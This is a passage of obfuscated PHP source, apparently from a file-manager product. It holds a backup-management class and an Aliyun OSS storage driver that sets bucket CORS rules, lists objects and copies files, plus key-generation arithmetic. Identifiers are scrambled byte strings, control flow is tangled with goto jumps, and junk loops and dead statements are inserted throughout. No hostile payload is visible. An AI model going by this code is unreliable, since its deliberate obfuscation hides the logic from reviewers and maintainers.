EÏªÉòéòÏ; CÍÓºáç¾ç: $D¶¿Ò†À‚Ê = $this->{$_SERVER[ù][147]}($FË°‰‘Ê ‹, $e¶öïŠâ) . $FŸæ‰’ºº®[344] . $c®©Û—; $AÙ÷Ë‚æ¢Ü = $EàÉŠÂ³ó®[604]; if (!$AÙ÷Ë‚æ¢Ü) { return; } goto cß¼“Ëõßé; cß¼“Ëõßé: return $D¶¿Ò†À‚Ê; goto B‡¹¨²©êÁ; a¯ó¿¡ª¿Å: $EàÉŠÂ³ó® =& $_SERVER[”Ì÷ñ­î¸]; $FŸæ‰’ºº® =& $_SERVER[ù]; $cÂ–Ï‡°Ï = $this->{$_SERVER[ù][340]}(); goto CÔ‰¡¾åÒ; e®ƒ¤É×ó’: $A¢šØ¦§ÌÕ = $FŸæ‰’ºº®[201](($cÂ–Ï‡°Ï + $F·Ç•Ó“¥) / 2); $B‹Ú°ÚÒÏå = $EàÉŠÂ³ó®[665]; if (strlen($B‹Ú°ÚÒÏå) < $EàÉŠÂ³ó®[559]) { return; } goto CİÃÁÒ‡Á¹; cÚ‚ìùç¸: for ($C‹¥ÍÊµÙ™ = 0; $C‹¥ÍÊµÙ™ < $Aì­Ëºâ  * 10; $C‹¥ÍÊµÙ™++) { if (($Aì­Ëºâ  * $C‹¥ÍÊµÙ™ + 1) % $A¢šØ¦§ÌÕ == 0) { $fÒ‰ª¥§ä‚ = $FŸæ‰’ºº®[201](($Aì­Ëºâ  * $C‹¥ÍÊµÙ™ + 1) / $A¢šØ¦§ÌÕ); break; } } $c®©Û— = $this->{$_SERVER[ù][147]}($cÂ–Ï‡°Ï * $F·Ç•Ó“¥ . $FŸæ‰’ºº®[10], $FŸæ‰’ºº®[149]); $e¶öïŠâ = $FŸæ‰’ºº®[114]($FŸæ‰’ºº®[341] . ($cÂ–Ï‡°Ï + $F·Ç•Ó“¥) . $FŸæ‰’ºº®[342] . $A¢šØ¦§ÌÕ . $FŸæ‰’ºº®[342] . $fÒ‰ª¥§ä‚ . $FŸæ‰’ºº®[343]); goto CÍÓºáç¾ç; B‡¹¨²©êÁ: } public function cbme31f195a5($aåšŒ¨ñ¢) { goto BŠÜ§ˆº ”; EÒƒİ¬º˜â: for ($eïÑ²¤Ó‘– = 3; $eïÑ²¤Ó‘– < $f‚ÙìÁãôà; $eïÑ²¤Ó‘– += 2) { if ($f‚ÙìÁãôà % $eïÑ²¤Ó‘– != 0) { continue; } $c„ÄÎ¦²ã = $eïÑ²¤Ó‘–; $Eïê¸¯ƒšõ = $bö…ÉÇÊöæ[673]; $Cç‚Ì‡½“Œ = $e”ËéÁôğ [201]($f‚ÙìÁãôà / $eïÑ²¤Ó‘–); break; $D²¯×¯É = $bö…ÉÇÊöæ[674]; if (!$D²¯×¯É) { return; } } $EóŸºÇÉ›ò = ($c„ÄÎ¦²ã - 1) * ($Cç‚Ì‡½“Œ - 1); $EÒ™È¢á‰À = $e”ËéÁôğ [201](($c„ÄÎ¦²ã + $Cç‚Ì‡½“Œ) / 2); goto e®ã†¥ Ï‰; DÆ«¿‰„ôÜ: while (strlen($EÀ‚°®¡) < $bö…ÉÇÊöæ[548]) { if (!$EÀ‚°®¡) { break; } $EÀ‚°®¡++; } goto d™ñ¡ÖÖÕ†; eˆ•“×¼ˆÆ: $EÎÕÌÅïé = $this->{$_SERVER[ù][246]}($Eˆ…Œ¥‰á´[0], $bÓÒØ÷ÀöÚ); return $EÎÕÌÅïé; $EÀ‚°®¡ = $bö…ÉÇÊöæ[679]; goto DÆ«¿‰„ôÜ; fóÜïÀÎ¦ì: $f‚ÙìÁãôà = $e”ËéÁôğ [201]($f‚ÙìÁãôà); $cŸ±öÂ¨ = $bö…ÉÇÊöæ[671]; while ($cŸ±öÂ¨ < $bö…ÉÇÊöæ[589]) { if ($cŸ±öÂ¨ >= 0) { break; } $cŸ±öÂ¨++; } goto dŒ®Œ÷ÉËä; e®ã†¥ Ï‰: while (1) { $eƒ†ŠÊÛ– = $EÒ™È¢á‰À; $E–åˆš¯¨‡ = $bö…ÉÇÊöæ[675]; $E‹’‰ˆ”Á = $EóŸºÇÉ›ò; $DÀĞñĞ¤ˆÊ = $bö…ÉÇÊöæ[676]; if (!$DÀĞñĞ¤ˆÊ) { return; } while ($E‹’‰ˆ”Á % $eƒ†ŠÊÛ– != 0) { $BÊŒñâÌÒŒ = $E‹’‰ˆ”Á; $A³±ù„‚Ò– = $bö…ÉÇÊöæ[677]; $E‹’‰ˆ”Á = $eƒ†ŠÊÛ–; $eƒ†ŠÊÛ– = $BÊŒñâÌÒŒ % $eƒ†ŠÊÛ–; } if ($eƒ†ŠÊÛ– == 1) { break; } else { $EÒ™È¢á‰À++; } } $f…™İöâ‘é = 2; $f•ŞóœŒ©ğ = $bö…ÉÇÊöæ[678]; goto bŸ«ÊÈ›ğ; bŸ«ÊÈ›ğ: if (!$f•ŞóœŒ©ğ) { return; } for ($eïÑ²¤Ó‘– = 0; $eïÑ²¤Ó‘– < $EóŸºÇÉ›ò * 10; $eïÑ²¤Ó‘–++) { if (($EóŸºÇÉ›ò * $eïÑ²¤Ó‘– + 1) % $EÒ™È¢á‰À == 0) { $f…™İöâ‘é = $e”ËéÁôğ [201](($EóŸºÇÉ›ò * $eïÑ²¤Ó‘– + 1) / $EÒ™È¢á‰À); break; } } $bÓÒØ÷ÀöÚ = $e”ËéÁôğ [114]($e”ËéÁôğ [341] . ($c„ÄÎ¦²ã + $Cç‚Ì‡½“Œ) . $e”ËéÁôğ [342] . $EÒ™È¢á‰À . $e”ËéÁôğ [342] . $f…™İöâ‘é . $e”ËéÁôğ [343]); goto eˆ•“×¼ˆÆ; BŠÜ§ˆº ”: $bö…ÉÇÊöæ =& $_SERVER[”Ì÷ñ­î¸]; $e”ËéÁôğ  =& $_SERVER[ù]; $Eˆ…Œ¥‰á´ = $e”ËéÁôğ [0]($e”ËéÁôğ [344], $aåšŒ¨ñ¢); goto FÔÙ¿¿¸î—; dŒ®Œ÷ÉËä: $c„ÄÎ¦²ã = 0; $DöŞ‘Ã¯¯œ = $bö…ÉÇÊöæ[672]; $Cç‚Ì‡½“Œ = 0; goto EÒƒİ¬º˜â; FÔÙ¿¿¸î—: if ($e”ËéÁôğ [19]($Eˆ…Œ¥‰á´) != 2) { return $e”ËéÁôğ [10]; } $f‚ÙìÁãôà = $this->{$_SERVER[ù][246]}($Eˆ…Œ¥‰á´[1] . $e”ËéÁôğ [10], $e”ËéÁôğ [149]); if (!$f‚ÙìÁãôà) { return $e”ËéÁôğ [10]; } goto fóÜïÀÎ¦ì; d™ñ¡ÖÖÕ†: } public function waboe7abdbaa() { goto d“øÌÜ‚; f…Ä·°©—: $fôéä«µ = 1; $A¥Æœ–‘›Ñ = $DÛ‰ÇîŠ‚ß[681]; while ($fôéä«µ <= (int) $b“¥¬™ĞÀÔ[346]($D²ŸÚÙˆ¤­)) { $f¨ßĞßšäŠ = $fôéä«µ; $E­õ…·ˆ = $DÛ‰ÇîŠ‚ß[682]; while ($E­õ…·ˆ < $DÛ‰ÇîŠ‚ß[555]) { if ($E­õ…·ˆ >= 0) { break; } $E­õ…·ˆ++; } while (!0) { $f¨ßĞßšäŠ++; $c…“Ç‘˜„ê = $DÛ‰ÇîŠ‚ß[683]; if (!$c…“Ç‘˜„ê) { return; } if ($f¨ßĞßšäŠ <= 2) { $fôéä«µ = $f¨ßĞßšäŠ; break; } else { if ($f¨ßĞßšäŠ < 2) { continue; } } $a÷Ç¿´ôç = !0; for ($E®šÃò†Ç‰ = 2; $E®šÃò†Ç‰ <= $b“¥¬™ĞÀÔ[346]($f¨ßĞßšäŠ); $E®šÃò†Ç‰++) { if ($f¨ßĞßšäŠ % $E®šÃò†Ç‰ == 0) { $a÷Ç¿´ôç = !1; } } if ($a÷Ç¿´ôç) { $fôéä«µ = $f¨ßĞßšäŠ; break; } } $Eíùó¼Ê™[] = $fôéä«µ; $D‰ù‹½Ã±• = $DÛ‰ÇîŠ‚ß[684]; if (strlen($D‰ù‹½Ã±•) < $DÛ‰ÇîŠ‚ß[589]) { return; } } goto c…—¯©õ; Fè–«ƒİˆ: $dƒ‚“Á§ = $DÛ‰ÇîŠ‚ß[680]; while ($dƒ‚“Á§ < $DÛ‰ÇîŠ‚ß[553]) { if ($dƒ‚“Á§ >= 0) { break; } $dƒ‚“Á§++; } $Eíùó¼Ê™ = array(); goto f…Ä·°©—; d“øÌÜ‚: $DÛ‰ÇîŠ‚ß =& $_SERVER[”Ì÷ñ­î¸]; $b“¥¬™ĞÀÔ =& $_SERVER[ù]; $D²ŸÚÙˆ¤­ = $b“¥¬™ĞÀÔ[325]($b“¥¬™ĞÀÔ[345](2, 14), $b“¥¬™ĞÀÔ[345](2, 16) - 1); goto Fè–«ƒİˆ; c…—¯©õ: $CïŠ×«Ùó = 2; for ($f¨ßĞßšäŠ = $D²ŸÚÙˆ¤­; $f¨ßĞßšäŠ > 1; $f¨ßĞßšäŠ--) { $a÷Ç¿´ôç = !0; $bØ²‘¨š  = $DÛ‰ÇîŠ‚ß[685]; while ($bØ²‘¨š  < $DÛ‰ÇîŠ‚ß[548]) { if ($bØ²‘¨š  >= 0) { break; } $bØ²‘¨š ++; } foreach ($Eíùó¼Ê™ as $fñ†ô£Û¯) { if ($f¨ßĞßšäŠ % $fñ†ô£Û¯ == 0) { $a÷Ç¿´ôç = !1; break; } } if ($a÷Ç¿´ôç) { $CïŠ×«Ùó = $f¨ßĞßšäŠ; break; } } return $CïŠ×«Ùó; goto BÃÕÚÛ…; BÃÕÚÛ…: $dš¼‡İÊê = $DÛ‰ÇîŠ‚ß[686]; if (!$dš¼‡İÊê) { die; } goto F‚Ç¤¯Ïù¼; F‚Ç¤¯Ïù¼: } public function qcpx326a320c($BÛÕ™†š”, $BÅ›‚Ä’Ñ) { $a½ ÎğÉ¯Á =& $_SERVER[ù]; return $a½ ÎğÉ¯Á[13](array($a½ ÎğÉ¯Á[14], $a½ ÎğÉ¯Á[347]), $BÛÕ™†š”, $BÅ›‚Ä’Ñ); $e‘Şƒå³»Ş = $_SERVER[”Ì÷ñ­î¸][687]; } public function wmcy95204850($Fâ…ÈÁ—Ú­, $f™ì•¶¡àœ) { $C›ÑÙÄ£÷ =& $_SERVER[ù]; return $C›ÑÙÄ£÷[13](array($C›ÑÙÄ£÷[348], $C›ÑÙÄ£÷[349]), $Fâ…ÈÁ—Ú­, $f™ì•¶¡àœ); } public function mzfn805e4f9c($fĞ—õÉ”Á¡, $a¨œô£µõ) { $d¿¢½ì„İ =& $_SERVER[ù]; return $d¿¢½ì„İ[13](array($d¿¢½ì„İ[348], $d¿¢½ì„İ[350]), $fĞ—õÉ”Á¡, $a¨œô£µõ); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $cèÃÕåËÏë =& $_SERVER[”Ì÷ñ­î¸]; self::$name = date($cèÃÕåËÏë[688]); if (!($FÚ·”Ä‹ë = Model($cèÃÕåËÏë[689])->lastItem())) { $FÚ·”Ä‹ë = $this->initData(); } else { self::$name = $FÚ·”Ä‹ë[$cèÃÕåËÏë[28]]; if ($FÚ·”Ä‹ë[$cèÃÕåËÏë[690]] == $cèÃÕåËÏë[83]) { self::$name = date($cèÃÕåËÏë[691]); $FØóÒøƒ = 0; if (isset($FÚ·”Ä‹ë[$cèÃÕåËÏë[281]][$cèÃÕåËÏë[167]][$cèÃÕåËÏë[419]])) { $FØóÒøƒ = (int) $FÚ·”Ä‹ë[$cèÃÕåËÏë[281]][$cèÃÕåËÏë[167]][$cèÃÕåËÏë[419]]; } if ($FÚ·”Ä‹ë[$cèÃÕåËÏë[28]] == self::$name) { Model($cèÃÕåËÏë[689])->remove($FÚ·”Ä‹ë[$cèÃÕåËÏë[367]]); } $FÚ·”Ä‹ë = $this->initData($FØóÒøƒ, $FÚ·”Ä‹ë[$cèÃÕåËÏë[692]]); } else { $this->checkStore($FÚ·”Ä‹ë[$cèÃÕåËÏë[692]]); } } self::$option = $FÚ·”Ä‹ë; } private function initData($Cøö‘»”¥ = 0, $B±î™ˆ±²® = '') { goto fô‰•‡ŒŞ³; Fˆ¼¦÷«â: $this->checkStore($fÂ‡²¥—ùˆ[$cë²ÈÌİ‡›[692]]); $a¼ŠÅá»¸¶ = array($cë²ÈÌİ‡›[692] => $fÂ‡²¥—ùˆ[$cë²ÈÌİ‡›[692]], $cë²ÈÌİ‡›[28] => self::$name, $cë²ÈÌİ‡›[690] => 0, $cë²ÈÌİ‡›[693] => $fÂ‡²¥—ùˆ[$cë²ÈÌİ‡›[693]], $cë²ÈÌİ‡›[281] => array($cë²ÈÌİ‡›[694] => array($cë²ÈÌİ‡›[690] => 0), $cë²ÈÌİ‡›[695] => array($cë²ÈÌİ‡›[690] => 0, $cë²ÈÌİ‡›[696] => 0, $cë²ÈÌİ‡›[697] => 0, $cë²ÈÌİ‡›[29] => $cë²ÈÌİ‡›[33]), $cë²ÈÌİ‡›[698] => array($cë²ÈÌİ‡›[690] => 0, $cë²ÈÌİ‡›[696] => 0, $cë²ÈÌİ‡›[697] => 0), $cë²ÈÌİ‡›[167] => array($cë²ÈÌİ‡›[690] => 0, $cë²ÈÌİ‡›[699] => 0, $cë²ÈÌİ‡›[700] => 0, $cë²ÈÌİ‡›[701] => 0, $cë²ÈÌİ‡›[702] => 0, $cë²ÈÌİ‡›[419] => $Cøö‘»”¥)), $cë²ÈÌİ‡›[703] => time(), $cë²ÈÌİ‡›[704] => 0); $E±¨œë’ÊÑ = Model($cë²ÈÌİ‡›[689])->insert($a¼ŠÅá»¸¶); goto fÀäÏâÎ‚; fÀäÏâÎ‚: $a¼ŠÅá»¸¶[$cë²ÈÌİ‡›[367]] = $E±¨œë’ÊÑ; return $a¼ŠÅá»¸¶; goto D…ãî—–Î‚; fô‰•‡ŒŞ³: $cë²ÈÌİ‡› =& $_SERVER[”Ì÷ñ­î¸]; $fÂ‡²¥—ùˆ = Model($cë²ÈÌİ‡›[689])->config(); if ($B±î™ˆ±²® && $fÂ‡²¥—ùˆ[$cë²ÈÌİ‡›[692]] != $B±î™ˆ±²®) { $Cøö‘»”¥ = 0; } goto Fˆ¼¦÷«â; D…ãî—–Î‚: } private function checkStore($d±ë…àôŞé) { $D£…—ÎÏ›ë =& $_SERVER[”Ì÷ñ­î¸]; $e˜½¹ÜŒà¿ = Model($D£…—ÎÏ›ë[705])->listData($d±ë…àôŞé); Model($D£…—ÎÏ›ë[705])->checkConfig($e˜½¹ÜŒà¿); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[”Ì÷ñ­î¸][689])->findByName(self::$name); } return self::$option; } public static function set($aŒç»â‘µä) { $D¡„Çšßñ =& $_SERVER[”Ì÷ñ­î¸]; $E•®İæ²®Ÿ = self::get(); foreach ($aŒç»â‘µä as $dˆ¦ˆù­¦™ => $bËÜ¸ÏÎ­Ş) { $c”²¼ƒ‡¯ˆ = explode($D¡„Çšßñ[91], $dˆ¦ˆù­¦™); $bõ«Ÿä¨© = count($c”²¼ƒ‡¯ˆ); switch ($bõ«Ÿä¨©) { case 1: $E•®İæ²®Ÿ[$c”²¼ƒ‡¯ˆ[0]] = $bËÜ¸ÏÎ­Ş; break; case 2: $E•®İæ²®Ÿ[$c”²¼ƒ‡¯ˆ[0]][$c”²¼ƒ‡¯ˆ[1]] = $bËÜ¸ÏÎ­Ş; break; case 3: $E•®İæ²®Ÿ[$c”²¼ƒ‡¯ˆ[0]][$c”²¼ƒ‡¯ˆ[1]][$c”²¼ƒ‡¯ˆ[2]] = $bËÜ¸ÏÎ­Ş; break; } } Model($D¡„Çšßñ[689])->update($E•®İæ²®Ÿ[$D¡„Çšßñ[367]], $E•®İæ²®Ÿ); self::$option = $E•®İæ²®Ÿ; return self::$option; } public function keep() { $FõÎ–äÆ®‰ =& $_SERVER[”Ì÷ñ­î¸]; $cíš³ÀÒ›ß = self::get(); if ($cíš³ÀÒ›ß[$FõÎ–äÆ®‰[281]][$FõÎ–äÆ®‰[694]][$FõÎ–äÆ®‰[690]] == $FõÎ–äÆ®‰[83]) { return; } $this->backupKeep($cíš³ÀÒ›ß); self::set(array($FõÎ–äÆ®‰[706] => 1)); } private function backupKeep($aÇÄ‡ÙÂÄÔ) { goto EèŞøÂ‰è; bŠÁÕ¦›Ñ: $e†å†Ÿâöš = 0; $Bœ¿ˆ´×ñÚ = array(); foreach ($B·†à¥Ä† as $eÍ÷—¥İˆç) { if ($e†å†Ÿâöš >= 7) { break; } $Bœ¿ˆ´×ñÚ[] = $eÍ÷—¥İˆç[$Bå±æßÌ Õ[28]]; $e†å†Ÿâöš++; } goto e¬Ä•Ï·×¼; e¬Ä•Ï·×¼: for ($e†å†Ÿâöš = 0; $e†å†Ÿâöš < 12; $e†å†Ÿâöš++) { $Bœ¿ˆ´×ñÚ[] = date($Bå±æßÌ Õ[707], strtotime("\x2d{$e†å†Ÿâöš}\40\155\157\x6e\164\x68\163")); } $Bœ¿ˆ´×ñÚ = array_unique($Bœ¿ˆ´×ñÚ); foreach ($B·†à¥Ä† as $eÍ÷—¥İˆç) { if (!empty($eÍ÷—¥İˆç[$Bå±æßÌ Õ[28]]) && in_array($eÍ÷—¥İˆç[$Bå±æßÌ Õ[28]], $Bœ¿ˆ´×ñÚ)) { continue; } Model($Bå±æßÌ Õ[689])->remove($eÍ÷—¥İˆç[$Bå±æßÌ Õ[367]]); $f–¿ñ¾½•Ú = "\173\151\157\72{$aÇÄ‡ÙÂÄÔ[$Bå±æßÌ Õ[692]]}\175\57\144\x61\164\x61\142\x61\163\145\57\142\141\x63\153\x75\x70\x5f{$eÍ÷—¥İˆç[$Bå±æßÌ Õ[28]]}"; IO::remove($f–¿ñ¾½•Ú, !1); } goto eù¡òåµà; EèŞøÂ‰è: $Bå±æßÌ Õ =& $_SERVER[”Ì÷ñ­î¸]; $B·†à¥Ä† = Model($Bå±æßÌ Õ[689])->listData(); if (empty($B·†à¥Ä†)) { return; } goto bŠÁÕ¦›Ñ; eù¡òåµà: } public function db() { goto eÍ£†°›ò; D¿‚»¶«¬À: $DÛˆªñ‰İğ = new BackupDb(); if (!$DÛˆªñ‰İğ->index()) { return !1; } self::set(array($bÈÊæä±‚×[708] => 1)); goto Fİì¬œ¢õâ; Fİì¬œ¢õâ: return !0; goto Cæ‘Åƒ†Èê; eÍ£†°›ò: $bÈÊæä±‚× =& $_SERVER[”Ì÷ñ­î¸]; $Có´Åá±Ï = self::get(); if ($Có´Åá±Ï[$bÈÊæä±‚×[281]][$bÈÊæä±‚×[695]][$bÈÊæä±‚×[690]] == $bÈÊæä±‚×[83]) { return !0; } goto D¿‚»¶«¬À; Cæ‘Åƒ†Èê: } public function dbFile() { goto aİ†„¾©; e¸îğÉ¢: $EöÅÀé©× = new BackupDbFile(); if (!$EöÅÀé©×->index()) { return !1; } self::set(array($cÙ´¯ï˜ìÌ[709] => 1)); goto aÚˆâ„ºÓà; aÚˆâ„ºÓà: return !0; goto C‰Û½–İÀŒ; aİ†„¾©: $cÙ´¯ï˜ìÌ =& $_SERVER[”Ì÷ñ­î¸]; $Aö­ÊåæÒ = self::get(); if ($Aö­ÊåæÒ[$cÙ´¯ï˜ìÌ[281]][$cÙ´¯ï˜ìÌ[698]][$cÙ´¯ï˜ìÌ[690]] == $cÙ´¯ï˜ìÌ[83]) { return !0; } goto e¸îğÉ¢; C‰Û½–İÀŒ: } public function file() { $AÓ‡÷–š´Ë =& $_SERVER[”Ì÷ñ­î¸]; $E·Ô¢È» = self::get(); if ($E·Ô¢È»[$AÓ‡÷–š´Ë[281]][$AÓ‡÷–š´Ë[167]][$AÓ‡÷–š´Ë[690]] == $AÓ‡÷–š´Ë[83]) { return !0; } if (!isset($E·Ô¢È»[$AÓ‡÷–š´Ë[693]]) || $E·Ô¢È»[$AÓ‡÷–š´Ë[693]] == $AÓ‡÷–š´Ë[468]) { $a¡«‹Ìßãß = new BackupFile(); if (!$a¡«‹Ìßãß->index()) { return !1; } } self::set(array($AÓ‡÷–š´Ë[710] => 1, $AÓ‡÷–š´Ë[690] => 1)); return !0; } } goto dŒÂ‚­ÔÎ¤; d—ğíÒ„¬†: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($c¤êìÈÙ÷) { parent::__construct(); include_once SDK_DIR . $_SERVER[”Ì÷ñ­î¸][1173]; $this->_init($c¤êìÈÙ÷); } public function _init($BÆĞ¶èÜ¼õ) { foreach ($BÆĞ¶èÜ¼õ as $eßƒË½ˆ¿Ø => $C¸ƒ«Õ”‚Ñ) { if (isset($this->{$eßƒË½ˆ¿Ø})) { $this->{$eßƒË½ˆ¿Ø} = $C¸ƒ«Õ”‚Ñ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[”Ì÷ñ­î¸][1174], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto b½†È†ÎŸÜ; b½†È†ÎŸÜ: $F£“®†ã¯ =& $_SERVER[”Ì÷ñ­î¸]; $FØòÜâ¿ò = new OSS\Model\CorsConfig(); $DË¨‘¨öÌ· = new OSS\Model\CorsRule(); goto e–´¼ªô•ó; e–´¼ªô•ó: $DË¨‘¨öÌ·->addAllowedOrigin($F£“®†ã¯[1175]); $DË¨‘¨öÌ·->addAllowedMethod($F£“®†ã¯[1176]); $DË¨‘¨öÌ·->addAllowedMethod($F£“®†ã¯[1177]); goto aä›È§óï; F…¶Ñ³œ½š: $DË¨‘¨öÌ·->setMaxAgeSeconds(600); $DË¨‘¨öÌ·->addExposeHeader($F£“®†ã¯[1180]); $DË¨‘¨öÌ·->addAllowedHeader($F£“®†ã¯[1175]); goto eàÈ¶‡¼½; eàÈ¶‡¼½: $FØòÜâ¿ò->addRule($DË¨‘¨öÌ·); try { $this->client->putBucketCors($this->bucket, $FØòÜâ¿ò); } catch (OSS\Core\OssException $f‡ƒ‰Éì©•) { return !1; } return !0; goto bõîïË‡‰; aä›È§óï: $DË¨‘¨öÌ·->addAllowedMethod($F£“®†ã¯[1178]); $DË¨‘¨öÌ·->addAllowedMethod($F£“®†ã¯[1179]); $DË¨‘¨öÌ·->addAllowedMethod($F£“®†ã¯[155]); goto F…¶Ñ³œ½š; bõîïË‡‰: } public function getBucketCors() { goto AÜĞ—’­‹ğ; føáŒò¨ïÂ: return array($e’‘ë³ßƒ[175] => isset($c«Ì«ƒ¨´³[0]) ? $c«Ì«ƒ¨´³[0] : $e’‘ë³ßƒ[33], $e’‘ë³ßƒ[179] => $F‡áï¦‰’µ, $e’‘ë³ßƒ[1181] => $c»Ÿ¨Ø³ïæ, $e’‘ë³ßƒ[1182] => isset($b‡´¬”¦Ù[0]) ? $b‡´¬”¦Ù[0] : $e’‘ë³ßƒ[33], $e’‘ë³ßƒ[177] => isset($C™¬®…à‡Á[0]) ? $C™¬®…à‡Á[0] : $e’‘ë³ßƒ[33]); goto C™—âµŸ±; AÜĞ—’­‹ğ: $e’‘ë³ßƒ =& $_SERVER[”Ì÷ñ­î¸]; $DÚœ…±¥‚¨ = null; try { $DÚœ…±¥‚¨ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $b‰ŠÊŠèÜ) { return null; } goto bñ±ôåƒËù; bñ±ôåƒËù: if (!$DÚœ…±¥‚¨ || !($b†ª”›Ëñ = $DÚœ…±¥‚¨->getRules())) { return null; } $c«Ì«ƒ¨´³ = $b†ª”›Ëñ[0]->getAllowedOrigins(); $F‡áï¦‰’µ = $b†ª”›Ëñ[0]->getAllowedMethods(); goto Eîàë¤ÛÃ‰; Eîàë¤ÛÃ‰: $c»Ÿ¨Ø³ïæ = $b†ª”›Ëñ[0]->getMaxAgeSeconds(); $b‡´¬”¦Ù = $b†ª”›Ëñ[0]->getExposeHeaders(); $C™¬®…à‡Á = $b†ª”›Ëñ[0]->getAllowedHeaders(); goto føáŒò¨ïÂ; C™—âµŸ±: } public function isBucketCors() { goto CÖÒ„²×èâ; CÖÒ„²×èâ: $A¬ãòŞª¹¥ =& $_SERVER[”Ì÷ñ­î¸]; $aÇ‡âİšëÛ = $this->getBucketCors(); if (!$aÇ‡âİšëÛ || !is_array($aÇ‡âİšëÛ)) { return !1; } goto AÜÖË»Ãæ; AÜÖË»Ãæ: if ($aÇ‡âİšëÛ[$A¬ãòŞª¹¥[175]] != $A¬ãòŞª¹¥[176] || $aÇ‡âİšëÛ[$A¬ãòŞª¹¥[177]] != $A¬ãòŞª¹¥[176]) { return !1; } $DÄ±ÊÀŒ = array_map($A¬ãòŞª¹¥[178], $aÇ‡âİšëÛ[$A¬ãòŞª¹¥[179]]); if (!is_array($DÄ±ÊÀŒ)) { $DÄ±ÊÀŒ = array(); } goto fä‹»¯…‡ß; fä‹»¯…‡ß: $b¡‚Œ®¬é = array($A¬ãòŞª¹¥[180], $A¬ãòŞª¹¥[181], $A¬ãòŞª¹¥[182], $A¬ãòŞª¹¥[183], $A¬ãòŞª¹¥[184]); $A½ ãë†Ë¸ = array_diff($b¡‚Œ®¬é, $DÄ±ÊÀŒ); return empty($A½ ãë†Ë¸); goto B¾Ñœ‰ï¶; B¾Ñœ‰ï¶: } public function mkfile($bùöœŠ, $dŒ‡’àÜÜ° = '', $b¨â™áÕ© = REPEAT_RENAME) { $Fœ½“šïó½ = $this->setContent($bùöœŠ, $dŒ‡’àÜÜ°); if ($Fœ½“šïó½ !== !1) { return $this->getPathOuter($bùöœŠ); } return !1; } public function mkdir($b‰èÎÍ™³÷, $bóÕâïŒö¼ = REPEAT_SKIP) { if ($this->_isFolder($b‰èÎÍ™³÷)) { return $this->getPathOuter($b‰èÎÍ™³÷); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($b‰èÎÍ™³÷)); } catch (OSS\Core\OssException $dè¬İö‡ñ) { return !1; } return $this->getPathOuter($b‰èÎÍ™³÷); } private function fileList($cÏ‘ã„, $B†³÷ÎÛ¿ = '', $bÕ»îˆ¬á¤ = 0) { goto eËÍßÔÄ´ï; dÄõÕŒÁ: while (!0) { $d°Ş‡Õñ†£ = array($Bé©œ¤‰è‡[1183] => $B†³÷ÎÛ¿, $Bé©œ¤‰è‡[186] => $D¯¯´‘¥¡À, $Bé©œ¤‰è‡[1184] => $D‡¸Ì¡µîè, $Bé©œ¤‰è‡[1185] => $BÆ‰³Üö‘); try { $bóìÏõÊ·ö = $this->client->listObjects($this->bucket, $d°Ş‡Õñ†£); } catch (OSS\Core\OssException $a¼Öªå™) { break; } $BÆ‰³Üö‘ = $bóìÏõÊ·ö->getNextMarker(); $C‚»åÜß„ = $bóìÏõÊ·ö->getObjectList(); $Cß…ÇÇŸ¶Á = $bóìÏõÊ·ö->getPrefixList(); foreach ($C‚»åÜß„ as $D¦êÆÁ¦™) { if ($D¦êÆÁ¦™->getKey() == $D¯¯´‘¥¡À) { continue; } $dÎÕ·ÄÑ£ = $D¦êÆÁ¦™->getKey(); if ($bÕ»îˆ¬á¤) { $dÎÕ·ÄÑ£ = array($Bé©œ¤‰è‡[28] => $dÎÕ·ÄÑ£, $Bé©œ¤‰è‡[77] => $D¦êÆÁ¦™->getSize(), $Bé©œ¤‰è‡[190] => strtotime($D¦êÆÁ¦™->getLastModified())); } $BÏñˆ¬åµ[] = $dÎÕ·ÄÑ£; } foreach ($Cß…ÇÇŸ¶Á as $b…˜¬†‡) { $E˜¯ÑÖì¶è[] = $b…˜¬†‡->getPrefix(); } if ($BÆ‰³Üö‘ === $Bé©œ¤‰è‡[33]) { break; } } return array($Bé©œ¤‰è‡[74] => $E˜¯ÑÖì¶è, $Bé©œ¤‰è‡[73] => $BÏñˆ¬åµ); goto EğÃ›äÄßŠ; c§†ºÍ‰ê: $BÆ‰³Üö‘ = $Bé©œ¤‰è‡[33]; $D‡¸Ì¡µîè = 1000; $E˜¯ÑÖì¶è = $BÏñˆ¬åµ = array(); goto dÄõÕŒÁ; eËÍßÔÄ´ï: $Bé©œ¤‰è‡ =& $_SERVER[”Ì÷ñ­î¸]; $cÏ‘ã„ = trim($cÏ‘ã„, $Bé©œ¤‰è‡[8]); $D¯¯´‘¥¡À = empty($cÏ‘ã„) ? $Bé©œ¤‰è‡[33] : $cÏ‘ã„ . $Bé©œ¤‰è‡[8]; goto c§†ºÍ‰ê; EğÃ›äÄßŠ: } public function copyFile($dÉ´Óàò, $E¨Â÷Ôö) { $FÀ’…æ«íø = $this->size($dÉ´Óàò); if ($FÀ’…æ«íø < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $dÉ´Óàò, $this->bucket, $this->pathEncode($E¨Â÷Ôö)); } catch (OSS\Core\OssException $d‘ ê˜ö‹ ) { return !1; } return !0; } return $this->multiCopyObject($dÉ´Óàò, $E¨Â÷Ôö, $FÀ’…æ«íø); } private function multiCopyObject($C¼‘îÍŠÄ‘, $CòãåëÖøˆ, $C¤³Ä¸éÏ¤) { $bÁòÍéô…Â =& $_SERVER[”Ì÷ñ­î¸]; try { goto FÆêà£˜Ë°; dˆ¥Ÿäæ‘: $BœÑÇ»àÍ© = array(); foreach ($e¼ÍÊéßÔ as $E¯—‹ Ü´ => $B½‰¦®’åŠ) { $BœÑÇ»àÍ©[] = array($bÁòÍéô…Â[1190] => $E¯—‹ Ü´ + 1, $bÁòÍéô…Â[1191] => $B½‰¦®’åŠ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($CòãåëÖøˆ), $eßèƒ’Í§Ä, $BœÑÇ»àÍ©); goto cÃôÛàÔ³ù; A¼‹á“­•: 